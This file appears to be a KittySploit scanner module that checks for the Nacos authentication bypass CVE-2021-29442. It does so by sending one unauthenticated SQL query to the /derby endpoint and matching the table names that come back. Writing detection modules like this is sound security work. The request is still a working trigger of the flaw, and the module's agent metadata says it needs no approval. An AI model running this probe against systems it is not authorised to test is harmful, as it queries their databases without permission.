#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Nacos before version 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nacos <1.4.1 - Authentication Bypass Detection',
        'description': 'Nacos before version 1.4.1 is vulnerable to authentication bypass because the ConfigOpsController lets the user perform management operations like querying the database or even wiping it out. While the /data/remove endpoint is properly protected with the @Secured annotation, the /derby endpoint is not protected and can be openly accessed by unauthenticated users. These endpoints are only valid when using embedded storage (derby DB) so this issue should not affect those installations using external storage (e.g. mysql).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'nacos', 'auth-bypass', 'alibaba', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/',
            'https://github.com/alibaba/nacos/issues/4463',
            'https://github.com/alibaba/nacos/pull/4517',
            'https://github.com/advisories/GHSA-36hp-jr8h-556f',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-29442',
        ],
        'cve': 'CVE-2021-29442',
    }

    def run(self):
        r = self.http_request(method="GET", path='/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('"TABLENAME":"(?:(?:(?:(?:(?:APP_CONFIGDATA_RELATION_[PS]UB|SYS(?:(?:CONGLOMERAT|ALIAS|(?:FI|RO)L)E|(?:(?:ROUTINE)?|COL)PERM|(?:FOREIGN)?KEY|CONSTRAINT|T(?:ABLEPERM|RIGGER)|S(?:TAT(?:EMENT|ISTIC)|EQUENCE|CHEMA)|DEPEND|CHECK|VIEW|USER)|USER|ROLE)S|CONFIG_(?:TAGS_RELATION|INFO_(?:AGGR|BETA|TAG))|TENANT_CAPACITY|GROUP_CAPACITY|PERMISSIONS|SYSCOLUMNS|SYS(?:DUMMY1|TABLES)|APP_LIST)|CONFIG_INFO)|TENANT_INFO)|HIS_CONFIG_INFO)"',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Nacos <1.4.1 - Authentication Bypass detected",
                path='/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st',
            )
            return True
        return False

